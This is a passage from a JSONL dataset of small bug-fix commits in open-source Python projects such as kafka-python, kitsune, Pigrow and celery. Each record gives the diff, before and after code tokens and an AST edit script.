[\"comparison_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:error_type\", 3, 41, 3, 51], 0], [\"Insert\", \"N0\", [\"is:is\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:NotControllerError\", 3, 53, 3, 71], 2], [\"Delete\", [\"identifier:isinstance\", 3, 30, 3, 40]], [\"Delete\", [\"(:(\", 3, 40, 3, 41]], [\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"):)\", 3, 71, 3, 72]], [\"Delete\", [\"argument_list\", 3, 40, 3, 72]], [\"Delete\", [\"call\", 3, 30, 3, 72]]]"}
{"project": "kafka-python", "commit_sha": "71efe2c2be3bd9729ec02df6bd6ce1b0cd6b4eba", "parent_sha": "370169029a9104f1963227005349f1dc6420a924", "file_path": "kafka/client.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -495,7 +495,7 @@ class SimpleClient(object):\n \n         Updates internal data: broker list, topic/partition list, and\n-        topic/parition -> broker map. This method should be called after\n+        topic/partition -> broker map. This method should be called after\n         receiving any error.\n \n         Note: Exceptions *will not* be raised in a full refresh (i.e. no topic\n", "before": "topic / parition - > broker map . This method should be called after", "after": "topic / partition - > broker map . This method should be called after", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:parition\", 2, 15, 2, 23], \"partition\"]]"}
{"project": "lesswrong", "commit_sha": "10d6a0e5e98a74ede944771156e43ce18cf853d3", "parent_sha": "b2f337ec9b8611a40ad46d6c7694b2bae1b8709a", "file_path": "r2/r2/lib/contrib/markdown.py", "project_url": "https://github.com/jimrandomh/lesswrong", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -286,7 +286,7 @@ class _Markdown:\n \n             url = url.replace(\"*\", self.escapetable[\"*\"])\n             url = url.replace(\"_\", self.escapetable[\"_\"])\n-            res = '''<a href=\"%s\"''' % quoted_url\n+            res = '''<a href=\"%s\"''' % htmlquote(url)\n \n             if not re.search('lesswrong|overcomingbias', res):\n                 res += ' rel=\"nofollow\"'\n", "before": "res = '''<a href=\"%s\"''' % quoted_url", "after": "res = '''<a href=\"%s\"''' % htmlquote ( url )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 19, 3, 50], [\"call\", \"N0\"], 2], [\"Update\", [\"identifier:quoted_url\", 3, 40, 3, 50], \"htmlquote\"], [\"Move\", \"N0\", [\"identifier:quoted_url\", 3, 40, 3, 50], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:url\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "requests-html", "commit_sha": "bc6b383a4819c6d2d6b14e0d087503d0583f9505", "parent_sha": "cba8a3acb84e3b2d683d2c6f51c2fcf797384c96", "file_path": "requests_html.py", "project_url": "https://github.com/wuqiangroy/requests-html", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ def user_agent(style=None):\n         return useragent[style]\n \n def get_session(mock_browser=True):\n-    \"\"\"Returns a consumable session, for cookie persistience and connection\n+    \"\"\"Returns a consumable session, for cookie persistence and connection\n     pooling, amongst other things.\n", "before": "session , for cookie persistience and connection", "after": "session , for cookie persistence and connection", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:persistience\", 3, 49, 3, 61], \"persistence\"]]"}
{"project": "requests-html", "commit_sha": "4e87dc2c2d5b1626513e159f8b70a9241462324c", "parent_sha": "44e86f34d02dbec891cceca9474977dcd8dc1af4", "file_path": "requests_html.py", "project_url": "https://github.com/wuqiangroy/requests-html", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ class BaseParser:\n \n                 try:\n                     href = link.attrs['href'].strip()\n-                    if not href.startswith('#') and self.skip_anchors and href not in ['javascript:;']:\n+                    if not(href.startswith('#') and self.skip_anchors) and href not in ['javascript:;']:\n                         if href:\n                             yield href\n                 except KeyError:\n", "before": "if not href . startswith ( '#' ) and self . skip_anchors and href not in [ 'javascript:;' ] : if href : yield href", "after": "if not ( href . startswith ( '#' ) and self . skip_anchors ) and href not in [ 'javascript:;' ] : if href : yield href", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 28, 3, 103], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 28, 3, 70], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cozmo-python-sdk", "commit_sha": "36ce3fc7ddfd055701620ccc04c6ed7bf0a74046", "parent_sha": "737bb380b5b3aa1f6f5b1eb2245f36c0f6676b5a", "file_path": "src/cozmo/camera.py", "project_url": "https://github.com/anki/cozmo-python-sdk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -235,7 +235,7 @@ class Camera(event.Dispatcher):\n         self._auto_exposure_enabled = True\n \n         if np is None:\n-            logger.warning(\"Camera image processing not available due to missng NumPy or Pillow packages: %s\" % _img_processing_available)\n+            logger.warning(\"Camera image processing not available due to missing NumPy or Pillow packages: %s\" % _img_processing_available)\n         else:\n             # set property to ensure clad initialization is sent.\n             self.image_stream_enabled = False\n", "before": "logger . warning ( \"Camera image processing not available due to missng NumPy or Pillow packages: %s\" % _img_processing_available )", "after": "logger . warning ( \"Camera image processing not available due to missing NumPy or Pillow packages: %s\" % _img_processing_available )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Camera image processing not available due to missng NumPy or Pillow packages: %s\\\"\", 3, 28, 3, 110], \"\\\"Camera image processing not available due to missing NumPy or Pillow packages: %s\\\"\"]]"}
{"project": "python-domino", "commit_sha": "83173be4967cd2b5f143894e55477d055def3478", "parent_sha": "5d465406ca097bd160444489e699ece98e423e56", "file_path": "domino/routes.py", "project_url": "https://github.com/marks/python-domino", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,4 +73,4 @@ class _Routes:\n     \n     # App URLs\n     def app_publish(self):\n-        return self.host + '/nb/startSession'\n+        return self._build_project_url() + '/nb/startSession'\n", "before": "return self . host + '/nb/startSession'", "after": "return self . _build_project_url ( ) + '/nb/startSession'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 46], [\"call\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 25], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Update\", [\"identifier:host\", 3, 21, 3, 25], \"_build_project_url\"], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "django-saml-service-provider", "commit_sha": "b85303d56280723ed80030fb4e988ce8d0262c81", "parent_sha": "702d1a16d753aa6a125ba612287a67c49eb8791d", "file_path": "saml_service_provider/settings.py", "project_url": "https://github.com/ovidner/django-saml-service-provider", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ class SAMLServiceProviderSettings(object):\n \n class OneloginServiceProviderSettings(SAMLServiceProviderSettings):\n     def __init__(self, onelogin_connector_id=None, onelogin_x509_cert=None, onelogin_x509_fingerprint=None, **kwargs):\n-        kwargs['idp_metadata_url'] = 'https://app.onelogin.com/saml/metadata/%s/' % onelogin_connector_id\n+        kwargs['idp_metadata_url'] = 'https://app.onelogin.com/saml/metadata/%s' % onelogin_connector_id\n         kwargs['idp_sso_url'] = 'https://app.onelogin.com/trust/saml2/http-post/sso/%s/' % onelogin_connector_id\n         kwargs['idp_slo_url'] = 'https://app.onelogin.com/trust/saml2/http-redirect/slo/%s/' % onelogin_connector_id\n         if onelogin_x509_cert:\n", "before": "kwargs [ 'idp_metadata_url' ] = 'https://app.onelogin.com/saml/metadata/%s/' % onelogin_connector_id", "after": "kwargs [ 'idp_metadata_url' ] = 'https://app.onelogin.com/saml/metadata/%s' % onelogin_connector_id", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'https://app.onelogin.com/saml/metadata/%s/'\", 3, 38, 3, 82], \"'https://app.onelogin.com/saml/metadata/%s'\"]]"}
{"project": "kitsune", "commit_sha": "f1c1fd8d299aefb01b04f73eb4501b045ba1c1ae", "parent_sha": "2147b0f51787caa31c8fef06e5664d7d90be3c31", "file_path": "apps/customercare/cron.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -125,7 +125,7 @@ def _filter_tweet(item, allow_links=False):\n     # No replies, no mentions\n-    if item['to_user_id'] or MENTION_REGEX.search(item['text']):\n+    if item.get('to_user_id') or MENTION_REGEX.search(item['text']):\n         statsd.incr('customercare.tweet.rejected.reply_or_mention')\n         return None\n \n", "before": "if item [ 'to_user_id' ] or MENTION_REGEX . search ( item [ 'text' ] ) : statsd . incr ( 'customercare.tweet.rejected.reply_or_mention' ) return None", "after": "if item . get ( 'to_user_id' ) or MENTION_REGEX . search ( item [ 'text' ] ) : statsd . incr ( 'customercare.tweet.rejected.reply_or_mention' ) return None", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 1, 8, 1, 64], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:item\", 1, 8, 1, 12], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"string:'to_user_id'\", 1, 13, 1, 25], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Delete\", [\"[:[\", 1, 12, 1, 13]], [\"Delete\", [\"]:]\", 1, 25, 1, 26]], [\"Delete\", [\"subscript\", 1, 8, 1, 26]]]"}
{"project": "Pigrow", "commit_sha": "893560e724d1149160704cc7349a93bb30bd4828", "parent_sha": "65a41e4d8dbcbb4baf7f1138b0bd9de4cad17ecc", "file_path": "scripts/autorun/reddit_settings_ear_2.py", "project_url": "https://github.com/arunderwood/Pigrow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -245,7 +245,7 @@ def write_set(whereto='wiki'):\n     cjob=0\n     for job in cron:\n         cjob=cjob+1\n-        modlink = ('https://www.reddit.com/message/compose/?to='+my_username+'&subject=cronmod:' + str(cjob) + '&message=updated_line_here')\n+        modlink = ('https://www.reddit.com/message/compose/?to='+my_username+'&subject=cronmod:' + str(cjob) + '&message=updated_line_here)')\n         enabled = job.is_enabled()\n         page_text += str(enabled) + \"|\" + str(job.slices) + \"|\"\n         page_text += str(job.command) + \"|\" + str(job.comment) + \"|\"\n", "before": "modlink = ( 'https://www.reddit.com/message/compose/?to=' + my_username + '&subject=cronmod:' + str ( cjob ) + '&message=updated_line_here' )", "after": "modlink = ( 'https://www.reddit.com/message/compose/?to=' + my_username + '&subject=cronmod:' + str ( cjob ) + '&message=updated_line_here)' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'&message=updated_line_here'\", 3, 112, 3, 140], \"'&message=updated_line_here)'\"]]"}
{"project": "kitsune", "commit_sha": "c4a0dbaaed45cec8c030fe6974f1688fee8f2d0e", "parent_sha": "03a99252042eb708c8ef0ae291ccead2b4469c18", "file_path": "scripts/update/deploy.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ def deploy_app(ctx):\n \n @hostgroups(settings.WEB_HOSTGROUP, remote_kwargs={'ssh_key': settings.SSH_KEY})\n def prime_app(ctx):\n-    ctx.remote(\"for i in {1..10}; do curl -so /dev/null -H 'Host: %s' -I http://localhost:81/ & sleep 1; done\" % (settings.REMOTE_HOSTNAME, http_port))\n+    ctx.remote(\"for i in {1..10}; do curl -so /dev/null -H 'Host: %s' -I http://localhost:81/ & sleep 1; done\" % settings.REMOTE_HOSTNAME)\n \n \n @hostgroups(settings.CELERY_HOSTGROUP, remote_kwargs={'ssh_key': settings.SSH_KEY})\n", "before": "ctx . remote ( \"for i in {1..10}; do curl -so /dev/null -H 'Host: %s' -I http://localhost:81/ & sleep 1; done\" % ( settings . REMOTE_HOSTNAME , http_port ) )", "after": "ctx . remote ( \"for i in {1..10}; do curl -so /dev/null -H 'Host: %s' -I http://localhost:81/ & sleep 1; done\" % settings . REMOTE_HOSTNAME )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 16, 3, 151], [\"attribute\", 3, 115, 3, 139], 2], [\"Delete\", [\"(:(\", 3, 114, 3, 115]], [\"Delete\", [\",:,\", 3, 139, 3, 140]], [\"Delete\", [\"identifier:http_port\", 3, 141, 3, 150]], [\"Delete\", [\"):)\", 3, 150, 3, 151]], [\"Delete\", [\"tuple\", 3, 114, 3, 151]]]"}
{"project": "Pigrow", "commit_sha": "4c3dc844f04aa5a96caeb2c2caba2757cdd0b055", "parent_sha": "89b10f36d525f8c0e7897c7b549ad51895d29d09", "file_path": "scripts/autorun/reddit_settings_ear.py", "project_url": "https://github.com/arunderwood/Pigrow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -286,7 +286,7 @@ def write_set(whereto='wiki'):\n     page_text += '|Reboot|Remotely reboots the pi|password protected  \\n'\n     page_text += '|Factory Reset|Restores Pigrow Defaults|password protected  \\n'\n     page_text += '|Update Pigrow|Automatically updates software|password protected  \\n'\n-    page_text += '|[Send Command]'+cmdlink+'send_cmd&message=PASSWORD|CMD &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\n'\n+    page_text += '|[Send Command]'+cmdlink+'send_cmd&message=PASSWORD pipe CMD if you don\\' want reddit ear to wait finish with &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\n'\n     page_text += \"|[Log]\"+cmdlink+\"log)|Create a custom log event|Include the text of the log event in the body of the message  \\n\"\n     page_text += \"|[update_wiki]\"+cmdlink+\"update_wiki)|Updates or creates the settings wiki|Replies with a link to it.  \\n\"\n     page_text += \"|[Archive Grow]\"+cmdlink+\"archive_grow)|Stores all the data for the current grow in an archive folder and starts a new grow|password protected  \\n\"\n", "before": "page_text += '|[Send Command]' + cmdlink + 'send_cmd&message=PASSWORD|CMD &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\n'", "after": "page_text += '|[Send Command]' + cmdlink + 'send_cmd&message=PASSWORD pipe CMD if you don\\' want reddit ear to wait finish with &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\n'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'send_cmd&message=PASSWORD|CMD &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\\\n'\", 3, 44, 3, 272], \"'send_cmd&message=PASSWORD pipe CMD if you don\\\\' want reddit ear to wait finish with &)|Send a bash command directly to the pi (dangerous)|lets you do almost anything, which is dangerous.. end command with an & if you don\\\\'t want reddit_ear to wait for it to finish PASS|COMMAND \\\\n'\"]]"}
{"project": "semstr", "commit_sha": "33145daf1ac6f979a03ee429ce8fbe4cd4ab1191", "parent_sha": "5aa14cc8e3f05f3362196e6049c61a97fb6a0921", "file_path": "semstr/conversion/export.py", "project_url": "https://github.com/huji-nlp/semstr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class ExportConverter(FormatConverter):\n         def __call__(self):\n             self._id += 1\n             assert self._id <= ExportConverter.MAX_TERMINAL_ID, \\\n-                \"More than %d nodes found\" % ExportConverter.MAX_TERMINAL_ID\n+                \"More than %d nodes found\" % (ExportConverter.MAX_TERMINAL_ID - ExportConverter.MIN_TERMINAL_ID + 1)\n             return str(self._id)\n \n     def __init__(self):\n", "before": "assert self . _id <= ExportConverter . MAX_TERMINAL_ID , \"More than %d nodes found\" % ExportConverter . MAX_TERMINAL_ID", "after": "assert self . _id <= ExportConverter . MAX_TERMINAL_ID , \"More than %d nodes found\" % ( ExportConverter . MAX_TERMINAL_ID - ExportConverter . MIN_TERMINAL_ID + 1 )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 17, 3, 77], [\"parenthesized_expression\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"binary_operator\", \"N1\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"binary_operator\", \"N2\"], 0], [\"Insert\", \"N1\", [\"+:+\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:1\", \"T\"], 2], [\"Move\", \"N2\", [\"attribute\", 3, 46, 3, 77], 0], [\"Insert\", \"N2\", [\"-:-\", \"T\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N3\", [\"identifier:ExportConverter\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:MIN_TERMINAL_ID\", \"T\"], 2]]"}
{"project": "celery", "commit_sha": "bc7eb64af22c1c8c482f5066483d52967d165ecf", "parent_sha": "fd4701ce72f0fc17ad6e941cd25ffedfcdd03d32", "file_path": "celery/bin/worker.py", "project_url": "https://github.com/Awingu/celery", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -175,7 +175,7 @@ class worker(Command):\n         # parse options before detaching so errors can be handled.\n         options, args = self.prepare_args(\n             *self.parse_options(prog_name, argv, command))\n-        self.maybe_detach([command] + sys.argv[1:])\n+        self.maybe_detach([command] + argv)\n         return self(*args, **options)\n \n     def maybe_detach(self, argv, dopts=['-D', '--detach']):\n", "before": "self . maybe_detach ( [ command ] + sys . argv [ 1 : ] )", "after": "self . maybe_detach ( [ command ] + argv )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 27, 3, 51], [\"identifier:argv\", 3, 43, 3, 47], 2], [\"Delete\", [\"identifier:sys\", 3, 39, 3, 42]], [\"Delete\", [\".:.\", 3, 42, 3, 43]], [\"Delete\", [\"attribute\", 3, 39, 3, 47]], [\"Delete\", [\"[:[\", 3, 47, 3, 48]], [\"Delete\", [\"integer:1\", 3, 48, 3, 49]], [\"Delete\", [\":::\", 3, 49, 3, 50]], [\"Delete\", [\"slice\", 3, 48, 3, 50]], [\"Delete\", [\"]:]\", 3, 50, 3, 51]], [\"Delete\", [\"subscript\", 3, 39, 3, 51]]]"}
{"project": "semstr", "commit_sha": "6dbc83f62861c0dc67cf6e4bb953d4c32127d351", "parent_sha": "e99af01a8610c50d82b98623cec9948e78bfe69d", "file_path": "semstr/conversion/conllu.py", "project_url": "https://github.com/huji-nlp/semstr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class ConlluConverter(DependencyConverter, convert.ConllConverter):\n             super().add_node(dep_node, edge, l1)\n \n     def preprocess(self, dep_nodes, to_dep=True):\n-        max_pos = max(d.position for d in dep_nodes or [0]) + 1\n+        max_pos = (max(d.position for d in dep_nodes) if dep_nodes else 0) + 1\n         for dep_node in dep_nodes:\n             def _attach_forward_sort_key(e):\n                 return e.dependent.position + (max_pos if e.dependent.position < dep_node.position else 0)\n", "before": "max_pos = max ( d . position for d in dep_nodes or [ 0 ] ) + 1", "after": "max_pos = ( max ( d . position for d in dep_nodes ) if dep_nodes else 0 ) + 1", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 19, 3, 64], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"conditional_expression\", \"N1\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Move\", \"N1\", [\"call\", 3, 19, 3, 60], 0], [\"Insert\", \"N1\", [\"if:if\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dep_nodes\", \"T\"], 2], [\"Insert\", \"N1\", [\"else:else\", \"T\"], 3], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 4], [\"Move\", [\"for_in_clause\", 3, 34, 3, 59], [\"identifier:dep_nodes\", 3, 43, 3, 52], 3], [\"Delete\", [\"or:or\", 3, 53, 3, 55]], [\"Delete\", [\"[:[\", 3, 56, 3, 57]], [\"Delete\", [\"integer:0\", 3, 57, 3, 58]], [\"Delete\", [\"]:]\", 3, 58, 3, 59]], [\"Delete\", [\"list\", 3, 56, 3, 59]], [\"Delete\", [\"boolean_operator\", 3, 43, 3, 59]]]"}
{"project": "script.skin.helper.service", "commit_sha": "40967cff7eb76bf7857f49caba8c014c97c5dbf1", "parent_sha": "6a67a695601da3bdd6178f81eb13e691f3b2f6df", "file_path": "default.py", "project_url": "https://github.com/mgonzales71/script.skin.helper.service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ class Main:\n                 path = WINDOW.getProperty(\"pvrthumbspath\").decode(\"utf-8\")\n                 WINDOW.setProperty(\"resetPvrArtCache\",\"reset\")\n                 success = True\n-                ret = xbmcgui.Dialog().yesno(heading=ADDON.getLocalizedString(32089), line1=ADDON.getLocalizedString(32090)+WINDOW.getProperty(\"pvrthumbspath\"))\n+                ret = xbmcgui.Dialog().yesno(heading=ADDON.getLocalizedString(32089), line1=ADDON.getLocalizedString(32090)+path)\n                 if ret:\n                     dirs, files = xbmcvfs.listdir(path)\n                     for file in files:\n", "before": "ret = xbmcgui . Dialog ( ) . yesno ( heading = ADDON . getLocalizedString ( 32089 ) , line1 = ADDON . getLocalizedString ( 32090 ) + WINDOW . getProperty ( \"pvrthumbspath\" ) )", "after": "ret = xbmcgui . Dialog ( ) . yesno ( heading = ADDON . getLocalizedString ( 32089 ) , line1 = ADDON . getLocalizedString ( 32090 ) + path )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:WINDOW\", 3, 125, 3, 131], \"path\"], [\"Move\", [\"binary_operator\", 3, 93, 3, 160], [\"identifier:WINDOW\", 3, 125, 3, 131], 2], [\"Delete\", [\".:.\", 3, 131, 3, 132]], [\"Delete\", [\"identifier:getProperty\", 3, 132, 3, 143]], [\"Delete\", [\"attribute\", 3, 125, 3, 143]], [\"Delete\", [\"(:(\", 3, 143, 3, 144]], [\"Delete\", [\"string:\\\"pvrthumbspath\\\"\", 3, 144, 3, 159]], [\"Delete\", [\"):)\", 3, 159, 3, 160]], [\"Delete\", [\"argument_list\", 3, 143, 3, 160]], [\"Delete\", [\"call\", 3, 125, 3, 160]]]"}
{"project": "script.skin.helper.service", "commit_sha": "35a149e9562275acfbea61902eaefb03bdc2b0a8", "parent_sha": "d725a563172211cafe7feff8775218dec3375a50", "file_path": "resources/lib/ListItemMonitor.py", "project_url": "https://github.com/mgonzales71/script.skin.helper.service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -790,7 +790,7 @@ class ListItemMonitor(threading.Thread):\n             self.pvrArtCache[dbID + \"SkinHelper.PVR.Artwork\"] = artwork\n         \n         #return if another listitem was focused in the meanwhile\n-        if multiThreaded and title != xbmc.getInfoLabel(\"ListItem.Title\").decode('utf-8'):\n+        if multiThreaded and not (title == xbmc.getInfoLabel(\"ListItem.Title\").decode('utf-8') or title == xbmc.getInfoLabel(\"ListItem.Label\").decode('utf-8')):\n             return\n         \n         #set window props\n", "before": "if multiThreaded and title != xbmc . getInfoLabel ( \"ListItem.Title\" ) . decode ( 'utf-8' ) : return", "after": "if multiThreaded and not ( title == xbmc . getInfoLabel ( \"ListItem.Title\" ) . decode ( 'utf-8' ) or title == xbmc . getInfoLabel ( \"ListItem.Label\" ) . decode ( 'utf-8' ) ) : return", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 90], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Move\", \"N2\", [\"comparison_operator\", 3, 30, 3, 90], 0], [\"Insert\", \"N2\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 2], [\"Insert\", [\"comparison_operator\", 3, 30, 3, 90], [\"==:==\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:title\", \"T\"], 0], [\"Insert\", \"N3\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N3\", [\"call\", \"N4\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\"argument_list\", \"N6\"], 1], [\"Insert\", \"N5\", [\"call\", \"N7\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N6\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N6\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N6\", [\"):)\", \"T\"], 2], [\"Insert\", \"N7\", [\"attribute\", \"N8\"], 0], [\"Insert\", \"N7\", [\"argument_list\", \"N9\"], 1], [\"Insert\", \"N8\", [\"identifier:xbmc\", \"T\"], 0], [\"Insert\", \"N8\", [\".:.\", \"T\"], 1], [\"Insert\", \"N8\", [\"identifier:getInfoLabel\", \"T\"], 2], [\"Insert\", \"N9\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N9\", [\"string:\\\"ListItem.Label\\\"\", \"T\"], 1], [\"Insert\", \"N9\", [\"):)\", \"T\"], 2], [\"Delete\", [\"!=:!=\", 3, 36, 3, 38]]]"}
{"project": "PyJack", "commit_sha": "cbf2416751dbd2612a13cf76ab5b3afd073dcb53", "parent_sha": "09f966d0a535b2ef1fe907e11c492328d2e53cee", "file_path": "blackjack/gioco.py", "project_url": "https://github.com/IacopoMelani/PyJack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -151,7 +151,7 @@ def menu(_giocatore, _mazzo, _mazziere):  # menu -> da riordinare(forse)\n                     if _giocatore.somma < _mazziere.somma and _mazziere.somma < 22:\n                         print \"%s ha perso con %d\\n il mazziere ha fatto: %d\" % (_giocatore.nome,_giocatore.somma,_mazziere.somma)\n                     if _mazziere.somma > 21:\n-                        print \"%s ha vinto con: %d\\nil mazziere ha sforato con: %d\" % (_mazziere.somma,_giocatore.nome,_giocatore.somma)\n+                        print \"%s ha vinto con: %d\\nil mazziere ha sforato con: %d\" % (_giocatore.nome,_giocatore.somma,_mazziere.somma)\n                     if _mazziere.somma == _giocatore.somma:\n                         print \"pareggio con:%d\" % _giocatore.somma\n                 else:\n", "before": "print \"%s ha vinto con: %d\\nil mazziere ha sforato con: %d\" % ( _mazziere . somma , _giocatore . nome , _giocatore . somma )", "after": "print \"%s ha vinto con: %d\\nil mazziere ha sforato con: %d\" % ( _giocatore . nome , _giocatore . somma , _mazziere . somma )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"attribute\", 3, 88, 3, 103], [\"tuple\", 3, 87, 3, 137], 3], [\"Move\", [\"attribute\", 3, 104, 3, 119], [\"tuple\", 3, 87, 3, 137], 1], [\"Move\", [\"attribute\", 3, 120, 3, 136], [\"tuple\", 3, 87, 3, 137], 4]]"}
{"project": "reverse", "commit_sha": "8d824fd790cf3b5b5c4dcb94f6704e8aa5f531c9", "parent_sha": "73a5f3231b2200ac01d057f3bd45f178aad6e20c", "file_path": "lib/vim.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -317,7 +317,7 @@ def generate_vim_syntax(filename):\n \n     match = 1\n     for addr, col in lib.colors.addr_color.items():\n-        fd.write(\"syn match RevAddr_%d \\\"0x%x:\\\"\\n\" % (match, addr))\n+        fd.write(\"syn match RevAddr_%d \\\"0x%x:\\?\\\"\\n\" % (match, addr))\n         fd.write(\"hi RevAddr_%d ctermfg=%d  guifg=#%s\\n\" % (match, col, RGB[col]))\n         match += 1\n \n", "before": "fd . write ( \"syn match RevAddr_%d \\\"0x%x:\\\"\\n\" % ( match , addr ) )", "after": "fd . write ( \"syn match RevAddr_%d \\\"0x%x:\\?\\\"\\n\" % ( match , addr ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"syn match RevAddr_%d \\\\\\\"0x%x:\\\\\\\"\\\\n\\\"\", 3, 18, 3, 52], \"\\\"syn match RevAddr_%d 